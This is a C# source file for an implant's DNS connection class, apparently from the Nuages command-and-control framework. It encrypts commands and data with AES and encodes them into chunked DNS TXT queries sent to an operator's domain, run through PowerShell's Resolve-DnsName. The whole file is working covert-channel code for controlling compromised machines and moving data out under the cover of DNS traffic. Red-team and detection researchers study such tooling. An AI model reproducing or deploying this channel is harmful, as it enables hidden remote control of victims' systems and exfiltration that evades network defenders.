using System;
using System.Collections.Generic;
using System.Json;
using NuagesSharpImplant.Utils;
using System.Net;

namespace NuagesSharpImplant.Connections
{
    class DNSAES256Connection : NuagesC2Connection
    {

        private string connectionString;

        private string handler = "DNSAES256";

        private AESHelper aes;

        public int refreshrate;

        public int buffersize;

        public DNSAES256Connection(string connectionString, string password, int buffersize, int refreshrate)
        {
            this.aes = new AESHelper(password);

            this.connectionString = connectionString;

            this.refreshrate = refreshrate;

            this.buffersize = buffersize;

        }
        public bool supportsBinaryIO()
        {

            return false;
        }

        public string getConnectionString()
        {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }

        public void setRefreshRate(int refreshrate)
        {
            this.refreshrate = refreshrate;
        }

        public void setBufferSize(int buffersize)
        {
            this.buffersize = buffersize;
        }

        public string POST(string url, string jsonContent)
        {
            string base64 = Convert.ToBase64String(this.aes.EncryptString(jsonContent));
            string magicBase64 = base64.Replace("+", "-0").Replace("/", "-1").Replace("=", "-2");
            int i = 0;
            int canSend = 221 - connectionString.Length;
            string chunk;
            string id;
            if (magicBase64.Length < canSend)
            {
                string prefix = "-1." + url.Substring(0, 1);
                return DNSComplete(prefix, magicBase64, this.connectionString);
            }
            else
            {
                chunk = magicBase64.Substring(i, canSend);
                id = DNSGetReqId(url.Substring(0, 1), chunk, this.connectionString);
            }
            i = canSend;
            canSend = 220 - (this.connectionString.Length + id.Length);
            int counter = 1;
            while (i < magicBase64.Length - canSend){
                chunk = magicBase64.Substring(i, canSend);
                DNSChunk(id, counter,chunk,this.connectionString);
                i += canSend;
                counter ++;
                System.Threading.Thread.Sleep(refreshrate);

            }
           chunk = magicBase64.Substring(i, magicBase64.Length - i);
           return  DNSComplete(id, chunk, this.connectionString);
        }

        string DNSGetReqId(string url, string chunk, string suffix)
        { 
            string req = "N." + url;
            int i;
            string response = "";
            for (i = 0; i < chunk.Length; i += 63)
            {
                req += "." + chunk.Substring(i, Math.Min(chunk.Length - i, 63));
            }
            req += "." + suffix;
            i = 0;
            while ((response.Length == 0) && (i < 5))
            {
                // Cant belive .Net does not have a way to get TXT records
                response = Posh.posh(String.Format("(Resolve-DnsName -Name {0} -Type TXT -QuickTimeout).strings;", req)).Trim();
                i++;
            }
            if (response == "-1")
            {
                throw new Exception("DNSError");
            }
            return response.Split('.')[1];

        }

        void DNSChunk(string id, int counter, string chunk, string suffix)
        {
            string req = "D." + id + "." + counter;
            int i;
            string response = "";
            for (i = 0; i < chunk.Length; i += 63)
            {
                req += "." + chunk.Substring(i, Math.Min(chunk.Length - i, 63));
            }
            req += "." + suffix;
            i = 0;
            while ((response.Length == 0) && (i < 5))
            {
                // Cant belive .Net does not have a way to get TXT records
                response = Posh.posh(String.Format("(Resolve-DnsName -Name {0} -Type TXT -QuickTimeout).strings;", req)).Trim();
                i++;
            }
            if (response.Trim() == "-1")
            {
                throw new Exception("DNSError");
            }

        }

        string DNSComplete(string id, string data, string suffix)
        {
            string req = "C." + id;
            int i;
            string response = "";
            for (i = 0; i < data.Length; i += 63){
                req += "." + data.Substring(i, Math.Min(data.Length - i, 63));
            }
            req += "." + suffix;
            i = 0;
            while ((response.Length == 0)  && (i < 5)){
                // Cant belive .Net does not have a way to get TXT records
                response = Posh.posh(String.Format("(Resolve-DnsName -Name {0} -Type TXT -QuickTimeout).strings;", req)).Trim();
            i++;
            }
            if ( response == "-1"){
                throw new Exception("DNSError");
            }

            string[] split = response.Split('.');

            if (split[2] != "200"){
                throw new Exception(split[2]);
            }
            return this.aes.DecryptString(Convert.FromBase64String(split[3].Replace("-0", "+").Replace("-1", "/").Replace("-2", "=")));
        }

        public byte[] POST(string url, byte[] input)
        {
            string[] temp = url.Split('/');
            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("pipe_id", temp[1]));
            list.Add(new KeyValuePair<string, JsonValue>("maxSize", temp[2]));
            list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
            JsonObject body = new JsonObject(list);
            JsonValue response = JsonValue.Parse(POST("io", body.ToString()));
            return Convert.FromBase64String(response["out"]);
        }
    }
}
